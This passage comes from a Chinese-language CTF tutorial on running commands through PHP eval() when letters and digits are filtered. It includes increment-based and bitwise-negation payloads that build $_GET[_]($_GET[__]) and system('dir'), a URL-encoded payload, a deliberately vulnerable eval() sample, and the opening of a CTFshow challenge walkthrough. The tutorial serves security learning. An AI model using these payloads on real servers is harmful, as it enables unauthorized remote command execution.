class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557649.png\" alt=\"在这里插入图片描述\"><br>此时成功获取到了字符<code>A</code>，有了<code>A</code>，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符<code>G</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Array</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//A</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//B</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//C</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//D</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//E</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//F</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//G</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557659.png\" alt=\"在这里插入图片描述\"><br>然后看我们这里的代码的话，是<code>eval($code)</code>，所以我们就可以构造这种的<code>$_GET[1]($_GET[0])</code>，这个时候我们就可以<code>system(ls)</code>这种命令的执行，所以接下来的话就开始构造</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Array</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//A</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//B</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//C</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//D</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//E</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//E</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//F</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//G</span>\n<span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//G</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//T</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$___</span><span class=\"token operator\">.</span><span class=\"token variable\">$__</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//GET</span>\n<span class=\"token comment\">//var_dump($_);</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_GET</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$_</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$_</span><span class=\"token punctuation\">[</span><span class=\"token constant\">__</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//$_GET[_]($_GET[__])</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$___</span><span class=\"token operator\">.</span><span class=\"token variable\">$__</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$$_</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$_</span><span class=\"token punctuation\">[</span><span class=\"token constant\">__</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>而后变成</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">5</span>B<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">5</span>B<span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token string single-quoted-string\">'%24'</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>___<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>___<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token string single-quoted-string\">'_'</span><span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">5</span>B_<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">5</span>B__<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时去尝试赋值<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557706.png\" alt=\"在这里插入图片描述\"><br>成功执行了命令，输出了当前目录</p>\n<h2 id=\"取反\"><a href=\"#取反\" class=\"headerlink\" title=\"取反\"></a>取反</h2><p>这个的话我们这里其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p>\n<p>这里的话利用一个php脚本即可获取我们想要的字符</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$ans1</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//函数名</span>\n<span class=\"token variable\">$ans2</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'dir'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//命令</span>\n<span class=\"token variable\">$data1</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'~'</span><span class=\"token operator\">.</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$ans1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//通过两次取反运算得到system</span>\n<span class=\"token variable\">$data2</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'~'</span><span class=\"token operator\">.</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$ans2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//通过两次取反运算得到dir</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'('</span><span class=\"token operator\">.</span><span class=\"token variable\">$data1</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">')'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'('</span><span class=\"token operator\">.</span><span class=\"token variable\">$data2</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">')'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557941.png\" alt=\"在这里插入图片描述\"><br>接下来为例尝试一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557029.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"关于自增的一些知识点\"><a href=\"#关于自增的一些知识点\" class=\"headerlink\" title=\"关于自增的一些知识点\"></a>关于自增的一些知识点</h1><h2 id=\"知识点1\"><a href=\"#知识点1\" class=\"headerlink\" title=\"知识点1\"></a>知识点1</h2><p>在自增中，可以通过特殊字符构造出字符串的有以下几种方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span>  <span class=\"token comment\">//Array</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">/</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span>   <span class=\"token comment\">//NAN</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span>   <span class=\"token comment\">//INF</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这个时候就有一个问题了，如果ban了数字，我们该怎么去构造<code>NAN</code>和<code>INF</code>呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个<code>NAN</code>和<code>INF</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是<span class=\"token number\">1985</span>年的<span class=\"token constant\">IEEE</span> <span class=\"token number\">754</span>浮点数标准。\n\n<span class=\"token constant\">INF</span>：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里可以看出<code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p>\n<h2 id=\"知识点2\"><a href=\"#知识点2\" class=\"headerlink\" title=\"知识点2\"></a>知识点2</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里需要说明一下，笔者小白，对这个不太了解，然后可能这并不算什么知识点，还请各位大师傅多多担待</p></blockquote>\n<p>我们在构造<code>$_POST</code>中的<code>_</code>时，正常操作的话是这样，<code>$a=&#39;_&#39;.$b(假设这里$b就是POST)</code>，然后这个时候如果<code>&#39;</code>被ban，看似这里是无法再利用了，但其实，我们直接写<code>$a=_.$b</code>也是可以的，这个时候效果同上而且缩短了字符长度。</p>\n<h1 id=\"CTF赛题实战\"><a href=\"#CTF赛题实战\" class=\"headerlink\" title=\"CTF赛题实战\"></a>CTF赛题实战</h1><h2 id=\"CTFshow吃瓜杯-shellme-Revenge\"><a href=\"#CTFshow吃瓜杯-shellme-Revenge\" class=\"headerlink\" title=\"CTFshow吃瓜杯[shellme_Revenge]\"></a>CTFshow吃瓜杯[shellme_Revenge]</h2><p>题目环境如下<br><a href=\"https://ctf.show/challenges#shellme_Revenge-1483\">https://ctf.show/challenges#shellme_Revenge-1483</a><br>进入环境后发现<code>phpinfo()</code>，找找有没有什么信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557059.png\"><br>搜索hint后发现<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557078.png\" alt=\"在这里插入图片描述\"><br>提示了<code>?looklook</code>，那我们这里可以猜出大概率是给了个访问的参数，我们在URL后加上<code>?looklook=1</code>，此时获取到源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'looklook'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"?looklook\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span 